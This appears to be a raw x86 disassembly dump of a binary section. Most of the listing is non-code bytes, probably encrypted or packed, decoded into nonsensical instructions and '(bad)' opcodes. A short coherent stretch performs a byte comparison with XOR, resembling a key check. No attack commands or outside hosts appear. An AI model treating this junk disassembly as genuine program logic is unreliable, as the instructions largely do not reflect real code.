  410b1f:	and    ebp,DWORD PTR [ecx+0x4cefdc9f]
  410b25:	inc    eax
  410b26:	cs sbb ecx,esp
  410b29:	inc    edx
  410b2a:	or     DWORD PTR [ebx+esi*8+0x656945d2],0x16
  410b32:	mov    ah,0x8e
  410b34:	(bad)  
  410b35:	sar    BYTE PTR [ecx-0x75400270],1
  410b3b:	(bad)  
  410b3d:	dec    eax
  410b3e:	sub    eax,DWORD PTR [esi]
  410b40:	and    BYTE PTR [ebx],0x62
  410b43:	jns    0x410acf
  410b45:	inc    edi
  410b46:	or     al,cl
  410b48:	mov    DWORD PTR [eax+0x2a4f60bb],ebx
  410b4e:	cld    
  410b4f:	xlat   BYTE PTR ds:[ebx]
  410b50:	mov    al,0xb9
  410b52:	xchg   ecx,eax
  410b53:	inc    ebp
  410b54:	jb     0x410ae7
  410b56:	stc    
  410b57:	psrlq  mm1,QWORD PTR [eax+0x678bbae0]
  410b5e:	pusha  
  410b5f:	add    cl,ch
  410b61:	push   edi
  410b62:	lea    ecx,[edx+0xc]
  410b65:	popf   
  410b66:	daa    
  410b67:	mov    dh,0xbe
  410b69:	call   0x13773a1b
  410b6e:	cld    
  410b6f:	jo     0x410bb6
  410b71:	shl    ch,0x4e
  410b74:	clc    
  410b75:	push   edi
  410b76:	sbb    al,0xfb
  410b78:	aad    0x9a
  410b7a:	fistp  DWORD PTR [ecx-0x7f]
  410b7d:	mov    ecx,0xae3f1fbd
  410b82:	(bad)  
  410b83:	js     0x410b14
  410b85:	and    bl,bh
  410b87:	push   es
  410b88:	xchg   edx,eax
  410b89:	mov    ebx,0x33649a5
  410b8e:	sub    ecx,DWORD PTR [ebp+0x9]
  410b91:	push   ebp
  410b92:	mov    dh,0x70
  410b94:	hlt    
  410b95:	sahf   
  410b96:	cld    
  410b97:	pusha  
  410b98:	(bad)  
  410b99:	fidivr WORD PTR [ecx-0x7439fc07]
  410b9f:	outs   dx,DWORD PTR ds:[esi]
  410ba0:	pop    esp
  410ba1:	pop    ebp
  410ba2:	mov    esp,0xf6ee6afc
  410ba7:	(bad)  
  410ba8:	iret   
  410ba9:	adc    dh,BYTE PTR [edx]
  410bab:	or     BYTE PTR [esi+0x2d2dfe7f],dl
  410bb1:	mov    eax,ds:0x69c350d0
  410bb6:	gs jbe 0x410b55
  410bb9:	(bad)  
  410bba:	jns    0x410c0d
  410bbc:	add    al,0x3b
  410bbe:	rol    BYTE PTR [eax-0x61],cl
  410bc1:	push   es
  410bc2:	rcr    ecx,1
  410bc4:	mov    ebp,0xc851d3cb
  410bc9:	or     al,0x93
  410bcb:	out    dx,al
  410bcc:	div    BYTE PTR [ebx]
  410bce:	mov    al,0xc6
  410bd0:	out    dx,al
  410bd1:	xchg   edx,eax
  410bd2:	daa    
  410bd3:	jge    0x410c12
  410bd5:	fdivr  QWORD PTR [edi-0x76]
  410bd8:	and    edx,DWORD PTR [ebx+0x3b7208cf]
  410bde:	(bad)  
  410bdf:	cmp    eax,0x8f5a8b30
  410be4:	pop    es
  410be5:	mov    al,0xa8
  410be7:	cmc    
  410be8:	pop    ebx
  410be9:	sar    DWORD PTR [edi-0x352ae95],1
  410bef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bf0:	retf   
  410bf1:	mov    ecx,0x663ec844
  410bf6:	xchg   edx,eax
  410bf7:	adc    edx,DWORD PTR [ebp-0x72]
  410bfa:	push   esi
  410bfb:	shl    DWORD PTR [ecx-0x1c3e9991],0x29
  410c02:	inc    ebp
  410c03:	(bad)  
  410c04:	push   esp
  410c05:	or     ch,BYTE PTR [ebx-0x49459839]
  410c0b:	addr16 sub eax,0x47d3bd1
  410c11:	pusha  
  410c12:	inc    ebx
  410c13:	int3   
  410c14:	or     BYTE PTR [edx-0xcc988b6],cl
  410c1a:	cli    
  410c1b:	lods   al,BYTE PTR ds:[esi]
  410c1c:	sbb    al,BYTE PTR [eax-0x5711cf19]
  410c22:	(bad)  
  410c24:	push   eax
  410c25:	gs push edi
  410c27:	or     esp,DWORD PTR [edi+0x500b6454]
  410c2d:	inc    esp
  410c2e:	adc    bl,cl
  410c30:	push   ebx
  410c31:	sub    BYTE PTR [ecx+0x5e380b3a],0xa3
  410c38:	stc    
  410c39:	rcr    esi,1
  410c3b:	in     eax,0xd
  410c3d:	inc    edi
  410c3e:	imul   esp,DWORD PTR [edi],0x13be26ee
  410c44:	hlt    
  410c45:	std    
  410c46:	pop    edx
  410c47:	into   
  410c48:	test   ch,bh
  410c4a:	pop    gs
  410c4c:	call   0x594a:0xe44ba1e7
  410c53:	mov    ds:0x6497d751,eax
  410c58:	dec    DWORD PTR [ebx-0x5b]
  410c5b:	in     eax,0xce
  410c5d:	pop    esi
  410c5e:	cli    
  410c5f:	xor    eax,0x7c451df7
  410c64:	test   BYTE PTR [ecx+0x656f00b3],0xed
  410c6b:	mov    ss:0x9df19ab8,al
  410c71:	(bad)  
  410c72:	loopne 0x410bf7
  410c74:	push   0xfffffff7
  410c76:	sbb    al,0x57
  410c78:	outs   dx,BYTE PTR ds:[esi]
  410c79:	pop    eax
  410c7a:	loop   0x410ca0
  410c7c:	xor    al,0x2d
  410c7e:	pop    es
  410c7f:	(bad)  
  410c80:	fsubr  DWORD PTR [ecx+ebp*1-0x3389d286]
  410c87:	cmp    edi,esp
  410c89:	cmp    dl,BYTE PTR [ecx-0x69342864]
  410c8f:	dec    edi
  410c90:	mov    DWORD PTR [edi-0x29],eax
  410c93:	adc    ebx,ebx
  410c95:	xor    eax,0xc14bd05
  410c9a:	sahf   
  410c9b:	jmp    FWORD PTR [edi+ebp*4]
  410c9e:	or     al,bh
  410ca0:	call   0xda6f039
  410ca5:	hlt    
  410ca6:	ficom  WORD PTR [edi+0x31]
  410ca9:	ret    
  410caa:	sahf   
  410cab:	mov    edi,0xcfd8a87e
  410cb0:	pop    ss
  410cb1:	jge    0x410d29
  410cb3:	or     ah,BYTE PTR [ecx]
  410cb5:	je     0x410cfd
  410cb7:	push   ebx
  410cb8:	fwait
  410cb9:	mov    esp,0x61d5f6e3
  410cbe:	stos   DWORD PTR es:[edi],eax
  410cbf:	cs dec eax
  410cc1:	sti    
  410cc2:	inc    eax
  410cc3:	(bad)  
  410cc4:	adc    ebp,edi
  410cc6:	loopne 0x410c8f
  410cc8:	adc    eax,0x720bbe5e
  410ccd:	mov    ebp,DWORD PTR [esi]
  410ccf:	in     eax,0xe
  410cd1:	aad    0x9c
  410cd3:	inc    esi
  410cd4:	mov    dl,0xbe
  410cd6:	rol    DWORD PTR [ecx-0x30d3963b],0x48
  410cdd:	fstp   QWORD PTR [eax-0x37]
  410ce0:	push   0xffffffe9
  410ce2:	aam    0xa7
  410ce4:	jecxz  0x410d54
  410ce6:	dec    esi
  410ce7:	inc    esi
  410ce8:	and    edx,DWORD PTR [ebx-0x6f]
  410ceb:	jge    0x410d4f
  410ced:	add    eax,0x9f94a8cd
  410cf2:	jg     0x410c82
  410cf4:	jmp    0x691f:0x7f243f03
  410cfb:	push   esp
  410cfc:	nop
  410cfd:	iret   
  410cfe:	sub    DWORD PTR [esi],edx
  410d00:	adc    BYTE PTR [eax+ecx*1+0x536ad147],bl
  410d07:	cmp    al,BYTE PTR [eax-0x76d1f08c]
  410d0d:	add    cl,BYTE PTR [ebx-0x361607bb]
  410d13:	add    al,BYTE PTR [eax]
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0xd573359c
  410d25:	inc    esp
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d96
  410d2f:	cld    
  410d30:	sti    
  410d31:	test   eax,0x7f9d9a6a
  410d36:	add    DWORD PTR [ebp+0x205c2405],esp
  410d3c:	mov    WORD PTR [edi-0x77],cs
  410d3f:	loopne 0x410d1a
  410d41:	fnstcw WORD PTR [eax-0x1a]
  410d44:	lea    edi,[edx+0x2b]
  410d47:	scas   eax,DWORD PTR es:[edi]
  410d48:	jmp    0x279cb2e9
  410d4d:	retf   0x14ce
  410d50:	sbb    esi,esp
  410d52:	loop   0x410d75
  410d54:	(bad)  
  410d55:	aad    0x51
  410d57:	inc    ebp
  410d58:	mov    dl,0xb6
  410d5a:	(bad)  
  410d5b:	jl     0x410d0d
  410d5d:	mov    dh,BYTE PTR [edi+0x56392241]
  410d63:	push   es
  410d64:	popa   
  410d65:	xchg   esp,eax
  410d66:	add    al,0x55
  410d68:	adc    al,0x7d
  410d6a:	push   ss
  410d6b:	cmp    al,0x2c
  410d6d:	mov    ds:0xbff0b8f4,eax
  410d72:	test   al,0x48
  410d74:	stos   BYTE PTR es:[edi],al
  410d75:	dec    ebp
  410d76:	std    
  410d77:	enter  0x57a6,0x67
  410d7b:	xchg   edi,eax
  410d7c:	dec    eax
  410d7d:	or     al,0x6a
  410d7f:	dec    edi
  410d80:	cmc    
  410d81:	nop
  410d82:	(bad)  
  410d83:	cmp    ebx,DWORD PTR [ecx-0x352c15f7]
  410d89:	dec    edx
  410d8a:	dec    eax
  410d8b:	aam    0xbe
  410d8d:	frstor [esi+edi*2+0x13ba634a]
  410d94:	adc    bl,0x58
  410d97:	jmp    0x8d78c82f
  410d9c:	lods   al,BYTE PTR ds:[esi]
  410d9d:	stos   DWORD PTR es:[edi],eax
  410d9e:	cmp    ebx,DWORD PTR [ebp+0x5e10c376]
  410da4:	test   BYTE PTR fs:[edi-0x64],0x18
  410da9:	cmp    BYTE PTR [edi+edi*1-0x4b],0x9d
  410dae:	add    al,0x76
  410db0:	les    esi,FWORD PTR [ecx+0x4eb75ac5]
  410db6:	sbb    ah,BYTE PTR [esi]
  410db8:	jp     0x410dea
  410dba:	aas    
  410dbb:	mov    ds:0x36406552,al
  410dc0:	gs icebp 
  410dc2:	add    eax,0xa2e3fede
  410dc7:	mov    esi,0x8d408332
  410dcc:	outs   dx,DWORD PTR ds:[esi]
  410dcd:	imul   ebp,DWORD PTR [eax],0xffffffc9
  410dd0:	js     0x410e0e
  410dd2:	aam    0x71
  410dd4:	popf   
  410dd5:	int3   
  410dd6:	(bad)  
  410dd7:	data16 sub al,0xb3
  410dda:	icebp  
  410ddb:	mov    ch,0x48
  410ddd:	dec    ebx
  410dde:	test   DWORD PTR [edx+0x7a7de77c],ebx
  410de4:	sbb    bh,BYTE PTR [ecx+eiz*2-0x187c283e]
  410deb:	inc    edi
  410dec:	cmp    al,0xd8
  410dee:	sub    al,0x63
  410df0:	lds    ebp,FWORD PTR [ecx+0x37d6ec5f]
  410df6:	lds    esi,FWORD PTR [ecx-0x58]
  410df9:	(bad)  
  410dfa:	call   0x959d3d74
  410dff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e00:	jns    0x410e7b
  410e02:	jae    0x410df4
  410e04:	adc    al,0x1f
  410e06:	mov    dl,0xce
  410e08:	mov    es:0x3c10c8c8,al
  410e0e:	imul   ecx,DWORD PTR ds:0xb0427031,0xffffffff
  410e15:	cmp    BYTE PTR [ebx+0x78b823d8],0x54
  410e1c:	icebp  
  410e1d:	(bad)  
  410e1e:	out    dx,al
  410e1f:	loopne 0x410e79
  410e21:	gs data16 jns 0x410e0c
  410e25:	mov    esp,0xb116829b
  410e2a:	inc    edx
  410e2b:	rcl    ecx,1
  410e2d:	dec    ebx
  410e2e:	dec    edx
  410e2f:	adc    al,0x27
  410e31:	int3   
  410e32:	mov    al,ds:0x4cf397f5
  410e37:	xchg   edi,eax
  410e38:	add    bl,bl
  410e3a:	cmp    DWORD PTR [ecx+0x1b],ebx
  410e3d:	push   edi
  410e3e:	jecxz  0x410e9e
  410e40:	dec    eax
  410e41:	cmp    esp,ecx
  410e43:	fiadd  DWORD PTR [ebx-0x45bd2ae2]
  410e49:	les    esi,FWORD PTR [eax]
  410e4b:	jg     0x410e84
  410e4d:	or     bh,dl
  410e4f:	cmp    cl,BYTE PTR [edi+edx*4-0x644006cd]
  410e56:	scas   eax,DWORD PTR es:[edi]
  410e57:	fdiv   QWORD PTR [esi+0x7b]
  410e5a:	jmp    0x9f3ff967
  410e5f:	sub    al,0x18
  410e61:	mov    dh,0x78
  410e63:	je     0x410e40
  410e65:	cmp    ecx,DWORD PTR [edx+0x22c23491]
  410e6b:	sar    DWORD PTR [edx-0x5839c23a],0x77
  410e72:	bound  eax,QWORD PTR [ebx]
  410e74:	sub    DWORD PTR [ebp+0x7303cf89],ecx
  410e7a:	leave  
  410e7b:	hlt    
  410e7c:	adc    al,BYTE PTR [esi-0x54db3e23]
  410e82:	push   esi
  410e83:	inc    ebp
  410e84:	repz mov WORD PTR [ecx+0x5],?
  410e88:	sti    
  410e89:	aas    
  410e8a:	fisttp WORD PTR [edx]
  410e8c:	div    BYTE PTR [ebx-0xd136536]
  410e92:	jns    0x410e9c
  410e94:	repnz push edi
  410e96:	jecxz  0x410e83
  410e98:	add    eax,0x675e7ce9
  410e9d:	jl     0x410e9d
  410e9f:	(bad)  
  410ea1:	push   ds
  410ea2:	fptan  
  410ea4:	(bad)  
  410ea5:	out    dx,al
  410ea6:	cld    
  410ea7:	stos   DWORD PTR es:[edi],eax
  410ea8:	std    
  410ea9:	jnp    0x410ebe
  410eab:	jo     0x410f0a
  410ead:	add    BYTE PTR [eax-0x747bd79e],bl
  410eb3:	mov    cl,0x64
  410eb5:	push   esp
  410eb6:	adc    BYTE PTR [edx+edx*2+0x276ba384],bl
  410ebd:	xchg   BYTE PTR [edx+0x3731f666],dl
  410ec3:	out    dx,eax
  410ec4:	lock jno 0x410e59
  410ec7:	cmp    al,0xc3
  410ec9:	xchg   ecx,eax
  410eca:	xchg   esi,eax
  410ecb:	mov    BYTE PTR [edx-0x54420a17],bh
  410ed1:	mov    ebx,edx
  410ed3:	fdiv   DWORD PTR [edx+0x4619b2e2]
  410ed9:	fst    QWORD PTR [eax-0x1f]
  410edc:	fsub   DWORD PTR [edx]
  410ede:	daa    
  410edf:	jmp    0x68dd:0x7c2b68e3
  410ee6:	push   eax
  410ee7:	mov    ch,0x95
  410ee9:	bound  ecx,QWORD PTR [ecx]
  410eeb:	js     0x410eb6
  410eed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410eee:	jp     0x410ee2
  410ef0:	mov    ds:0x210207bd,al
  410ef5:	fwait
  410ef6:	adc    eax,0x85919add
  410efb:	cld    
  410efc:	retf   
  410efd:	cwde   
  410efe:	pop    ebp
  410eff:	(bad)  
  410f00:	frndint 
  410f02:	xor    eax,0xb0a24479
  410f07:	jbe    0x410f5e
  410f09:	inc    ebx
  410f0a:	mov    BYTE PTR [ecx],dh
  410f0c:	mov    dh,0x89
  410f0e:	push   ss
  410f0f:	les    edx,FWORD PTR [ecx+ebx*1-0x4b]
  410f13:	inc    ebx
  410f14:	pop    ebp
  410f15:	(bad)  
  410f16:	jmp    0xc17e:0xfa200ae6
  410f1d:	repnz test DWORD PTR cs:[ebp+0x6f],ebp
  410f22:	out    dx,eax
  410f23:	fbstp  TBYTE PTR [ecx-0x59244daa]
  410f29:	lock cmp edx,DWORD PTR [eax]
  410f2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f2d:	ss cmc 
  410f2f:	xrelease mov DWORD PTR ss:[esi+0x60],edx
  410f34:	(bad)  
  410f36:	popa   
  410f37:	pop    ecx
  410f38:	xor    bh,BYTE PTR [esi-0x64]
  410f3b:	cmc    
  410f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f3d:	nop
  410f3e:	test   DWORD PTR [esi+0x3fad63d3],ecx
  410f44:	pop    edi
  410f45:	pop    eax
  410f46:	ret    
  410f47:	mov    esi,0x1e21c289
  410f4c:	add    al,0xe1
  410f4e:	stc    
  410f4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f50:	clc    
  410f51:	jns    0x410f2b
  410f53:	mov    ecx,0x11739680
  410f58:	mov    edi,0xa45e2be6
  410f5d:	out    0xa3,al
  410f5f:	sub    eax,0x366273f
  410f64:	push   edi
  410f65:	shl    dl,0x57
  410f68:	out    dx,eax
  410f69:	mov    ah,0xa
  410f6b:	push   ss
  410f6c:	cdq    
  410f6d:	jle    0x410fe4
  410f6f:	mov    ds:0x297226e8,al
  410f74:	test   DWORD PTR [ebx+ebx*2-0x53364c51],edi
  410f7b:	jecxz  0x410fb3
  410f7d:	jae    0x410fdd
  410f7f:	or     DWORD PTR [edx],ebx
  410f81:	aaa    
  410f82:	in     eax,0xe8
  410f84:	or     DWORD PTR [edi],0x4a8b4602
  410f8a:	pushf  
  410f8b:	inc    ecx
  410f8c:	pop    es
  410f8d:	cmp    bl,BYTE PTR es:[ebp+0x15]
  410f91:	clc    
  410f92:	mov    edx,0xc1abb575
  410f97:	repnz or DWORD PTR [edx-0x51],ebp
  410f9b:	xor    eax,0xc9e0c3e8
  410fa0:	add    eax,0xf7bcb8a6
  410fa5:	sbb    ch,BYTE PTR [ebp-0x3053cec9]
  410fab:	push   0x59
  410fad:	cmp    BYTE PTR [esi+0x4d],ah
  410fb0:	or     DWORD PTR [ebx+esi*4-0x14],edi
  410fb4:	(bad)  
  410fb6:	add    esi,eax
  410fb8:	add    eax,0x7299966
  410fbd:	bound  edi,QWORD PTR [esi-0xa]
  410fc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fc1:	or     eax,0x1f4b8a49
  410fc6:	dec    esp
  410fc7:	add    eax,0xd693a9b4
  410fcc:	cs in  al,0xf3
  410fcf:	mov    esi,0xf5cf6d6e
  410fd4:	ds jl  0x410fe7
  410fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fd8:	in     al,dx
  410fd9:	dec    esp
  410fda:	pop    ds
  410fdb:	xchg   DWORD PTR es:[edx+0x3c133a1],eax
  410fe2:	(bad)  
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x41107f
  41102b:	clc    
  41102c:	jne    0x411055
  41102e:	sbb    BYTE PTR [edi+0x7e],al
  411031:	jle    0x410fe2
  411033:	jl     0x4110b3
  411035:	jle    0x4110af
  411037:	and    ch,dl
  411039:	loope  0x411017
  41103b:	(bad)  
  41103c:	sbb    edi,DWORD PTR [eax-0x63f1d8ab]
  411042:	and    cl,BYTE PTR [ecx]
  411044:	cmp    DWORD PTR [ebx-0x51],edx
  411047:	test   eax,0x19c00116
  41104c:	lea    edx,[ebx-0x5d72f9b5]
  411052:	aaa    
  411053:	enter  0xfe21,0x32
  411057:	and    edx,DWORD PTR [eax-0x2e3822e0]
  41105d:	fsubr  DWORD PTR [esi+edi*4+0x4c83a62e]
  411064:	test   ebx,0x958ec925
  41106a:	adc    BYTE PTR [edi-0x3e29ddba],al
  411070:	adc    esi,0x83ef1c36
  411076:	lods   eax,DWORD PTR ds:[esi]
  411077:	adc    ebp,esp
  411079:	add    BYTE PTR [eax],0xf3
  41107c:	stc    
  41107d:	mov    al,al
  41107f:	sbb    BYTE PTR [eax-0x4a],bh
  411082:	popa   
  411083:	idiv   DWORD PTR [ebx-0x70981db6]
  411089:	and    eax,DWORD PTR [edx]
  41108b:	xor    eax,0x3a989732
  411090:	sbb    bh,BYTE PTR [ebp+0x5ade0562]
  411096:	sbb    BYTE PTR [esi],ah
  411098:	shl    dh,0xc4
  41109b:	loope  0x4110ce
  41109d:	div    ebx
  41109f:	dec    eax
  4110a0:	xor    bh,BYTE PTR [ebx]
  4110a2:	xchg   esp,eax
  4110a3:	arpl   WORD PTR [eax+0x5b],di
  4110a6:	add    ah,BYTE PTR [ebx+ebp*8-0xdcc3947]
  4110ad:	je     0x411043
  4110af:	(bad)  
  4110b0:	lods   al,BYTE PTR ds:[esi]
  4110b1:	pop    es
  4110b2:	leave  
  4110b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110b4:	cdq    
  4110b5:	sub    bh,bl
  4110b7:	scas   al,BYTE PTR es:[edi]
  4110b8:	push   edx
  4110b9:	enter  0xd83d,0x52
  4110bd:	das    
  4110be:	mov    dl,0x1e
  4110c0:	inc    ebx
  4110c1:	jl     0x4110c5
  4110c3:	mov    WORD PTR cs:[ebp-0x54],es
  4110c7:	adc    BYTE PTR [esi+0x6e5f1361],0xc1
  4110ce:	pop    ebp
  4110cf:	ss mov edx,0x5a153d1b
  4110d5:	pop    ds
  4110d6:	call   DWORD PTR [esi+0x78]
  4110d9:	cmp    al,0x97
  4110db:	arpl   WORD PTR [ecx],bp
  4110dd:	adc    al,0x5b
  4110df:	jo     0x411070
  4110e1:	call   0xb20d2935
  4110e6:	cwde   
  4110e7:	fcomp  DWORD PTR [eax-0x75d95116]
  4110ed:	adc    DWORD PTR [edx+0xb84c4e2],esi
  4110f3:	sahf   
  4110f4:	ret    
  4110f5:	test   al,0xea
  4110f7:	out    0x2a,eax
  4110f9:	xchg   esi,eax
  4110fa:	xchg   ebp,eax
  4110fb:	and    BYTE PTR [edx-0x71],bh
  4110fe:	pushf  
  4110ff:	xchg   ebx,eax
  411100:	lods   al,BYTE PTR ds:[esi]
  411101:	jb     0x41111c
  411103:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411104:	dec    ecx
  411105:	cs das 
  411107:	sub    BYTE PTR [edx+0x170b61fb],al
  41110d:	mov    al,ds:0x6d283e52
  411112:	loopne 0x411177
  411114:	loopne 0x411143
  411116:	ficom  WORD PTR [eax]
  411118:	inc    ebx
  411119:	rol    DWORD PTR [eax+0x3a],1
  41111c:	nop
  41111d:	mov    edi,DWORD PTR [ebp-0xdaeee6e]
  411123:	mov    al,ds:0x2a8b8c3d
  411128:	cli    
  411129:	lods   eax,DWORD PTR ds:[esi]
  41112a:	jmp    0x536e:0xc5b3a72c
  411131:	xor    DWORD PTR [edx],ecx
  411133:	and    al,0x8b
  411135:	push   es
  411136:	xchg   ebx,eax
  411137:	jbe    0x411150
  411139:	popf   
  41113a:	in     al,0x8f
  41113c:	icebp  
  41113d:	stos   DWORD PTR es:[edi],eax
  41113e:	push   0xbd2bdc4
  411143:	push   edx
  411144:	and    ch,BYTE PTR [edi+0x773dce89]
  41114a:	fidiv  DWORD PTR [eax]
  41114c:	fsubr  QWORD PTR [eax+0x40c6d4be]
  411152:	sbb    dl,BYTE PTR [ebp+0x42]
  411155:	push   ebx
  411156:	mov    ds:0x9a33232e,eax
  41115b:	pop    edi
  41115c:	inc    ecx
  41115d:	jno    0x411172
  41115f:	mov    bh,0x33
  411161:	(bad)  
  411162:	push   esp
  411163:	mov    ch,0x2e
  411165:	call   eax
  411167:	and    al,0x14
  411169:	popf   
  41116a:	and    eax,0x423927b7
  41116f:	loope  0x4111ea
  411171:	(bad)  
  411172:	and    edx,DWORD PTR [edx-0x2e]
  411175:	pop    edi
  411176:	cmc    
  411177:	mov    DWORD PTR [ecx+0x44],0xb1c61af3
  41117e:	mov    bl,ch
  411180:	cmc    
  411181:	repnz mov WORD PTR [edx],fs
  411184:	jo     0x411137
  411186:	mov    edi,0x67e7bab1
  41118b:	test   eax,0x4f61174
  411190:	pop    eax
  411191:	add    DWORD PTR [ebx+0x1bde4e66],0xffffffae
  411198:	sub    DWORD PTR [ecx],ebp
  41119a:	xchg   ecx,eax
  41119b:	sbb    edx,DWORD PTR [ebx+0x23]
  41119e:	cld    
  41119f:	(bad)  
  4111a0:	neg    DWORD PTR [edi+0x5218d28c]
  4111a6:	mov    dl,BYTE PTR [ebp-0x26]
  4111a9:	fadd   DWORD PTR [ecx+eiz*4]
  4111ac:	dec    edi
  4111ad:	je     0x411132
  4111af:	mov    dh,0xae
  4111b1:	rep outs dx,DWORD PTR ds:[esi]
  4111b3:	addr16 in al,dx
  4111b5:	jbe    0x4111ef
  4111b7:	lock js 0x4111ae
  4111ba:	(bad)  
  4111bb:	mov    bh,0x2f
  4111bd:	inc    eax
  4111be:	and    esp,DWORD PTR ds:0x25317ad9
  4111c4:	cld    
  4111c5:	out    0x90,al
  4111c7:	push   edx
  4111c8:	xor    al,BYTE PTR [ecx]
  4111ca:	pop    ebx
  4111cb:	inc    ebx
  4111cc:	leave  
  4111cd:	rcl    DWORD PTR [ebp-0xf2a260f],1
  4111d3:	ror    DWORD PTR [esi],0x85
  4111d6:	imul   BYTE PTR [eax-0x22163962]
  4111dc:	sub    ah,BYTE PTR [eax-0x6695b821]
  4111e2:	stos   DWORD PTR es:[edi],eax
  4111e3:	aas    
  4111e4:	pop    esi
  4111e5:	push   0xffffffc9
  4111e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111e8:	sbb    DWORD PTR [ecx-0x4b],esp
  4111eb:	jmp    0x4111d9
  4111ed:	sbb    DWORD PTR [esi+0x59],edi
  4111f0:	xor    al,0x54
  4111f2:	cmp    BYTE PTR [edi+0x41],al
  4111f5:	cld    
  4111f6:	mov    esi,0x23ea6d29
  4111fb:	in     al,dx
  4111fc:	enter  0x816e,0x18
  411200:	dec    esp
  411201:	in     eax,0xb1
  411203:	ja     0x4111e0
  411205:	jns    0x41123e
  411207:	popa   
  411208:	sub    ah,BYTE PTR [ebx]
  41120a:	daa    
  41120b:	pop    ss
  41120c:	inc    edi
  41120d:	push   esp
  41120e:	dec    edi
  41120f:	sbb    DWORD PTR [edi],ebp
  411211:	adc    DWORD PTR [edi],esp
  411213:	pushf  
  411214:	sbb    cl,BYTE PTR [eax+0x17026008]
  41121a:	(bad)  
  41121b:	dec    ecx
  41121c:	sub    eax,0xa9701141
  411221:	dec    esi
  411222:	(bad)  
  411223:	adc    cl,dh
  411225:	daa    
  411226:	imul   eax,ecx,0xab50a0fa
  41122c:	mov    cl,0xe8
  41122e:	leave  
  41122f:	xchg   DWORD PTR [eax],esi
  411231:	iret   
  411232:	sbb    al,0x11
  411234:	inc    ebx
  411235:	lahf   
  411236:	(bad)  
  411237:	in     eax,0x50
  411239:	or     ebp,eax
  41123b:	mov    dl,0x95
  41123d:	clc    
  41123e:	arpl   bx,dx
  411240:	add    ecx,0x26
  411243:	inc    ecx
  411244:	psrlq  mm0,QWORD PTR [esi+edi*8-0x69ac9932]
  41124c:	pop    esi
  41124d:	out    0x1c,al
  41124f:	cdq    
  411250:	addr16 imul ebx,ebp,0x3f
  411254:	repnz dec edx
  411256:	pop    edi
  411257:	rcl    DWORD PTR [ebp+eiz*1-0x23d58d78],0x9e
  41125f:	sbb    bl,bh
  411261:	and    BYTE PTR [ebx],dl
  411263:	adc    edi,DWORD PTR [edi+0xb]
  411266:	aaa    
  411267:	xchg   edx,edx
  411269:	inc    edx
  41126a:	call   0x5abc0f3f
  41126f:	dec    esi
  411270:	cmp    al,0x60
  411272:	jno    0x411245
  411274:	cli    
  411275:	shl    BYTE PTR [eax-0x64],cl
  411278:	dec    esi
  411279:	jmp    0xceb8f0ba
  41127e:	push   esi
  41127f:	imul   eax,esi,0x6c70c27
  411285:	out    dx,eax
  411286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411287:	lock sar DWORD PTR [ebp+0x32b0c485],0x43
  41128f:	mov    esp,DWORD PTR [ecx]
  411291:	scas   al,BYTE PTR es:[edi]
  411292:	cli    
  411293:	cld    
  411294:	adc    BYTE PTR [ecx-0x67606738],0xa8
  41129b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41129c:	add    eax,0x1415324
  4112a1:	in     al,dx
  4112a2:	sbb    eax,DWORD PTR [ebp+0x764411b9]
  4112a8:	ja     0x411326
  4112aa:	(bad)  [esi]
  4112ac:	mov    edx,0xffac2ff3
  4112b1:	daa    
  4112b2:	xchg   esp,eax
  4112b3:	repnz aaa 
  4112b5:	jge    0x411319
  4112b7:	shr    BYTE PTR [ecx],cl
  4112b9:	mov    dh,0x60
  4112bb:	dec    ebp
  4112bc:	sbb    dl,BYTE PTR [ecx-0x49]
  4112bf:	inc    esi
  4112c0:	adc    eax,0x2bdde93c
  4112c5:	xchg   ebx,ebx
  4112c7:	int    0x32
  4112c9:	neg    dh
  4112cb:	sub    al,0x2c
  4112cd:	cmp    BYTE PTR [ebx-0x6465989d],al
  4112d3:	inc    DWORD PTR [ebx-0x513dbe83]
  4112d9:	jmp    0x3b5e:0x8152502e
  4112e0:	dec    esp
  4112e1:	dec    ecx
  4112e2:	inc    esp
  4112e3:	dec    ebx
  4112e4:	xchg   dl,al
  4112e6:	adc    eax,0x2fe840f
  4112eb:	add    BYTE PTR [eax],al
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
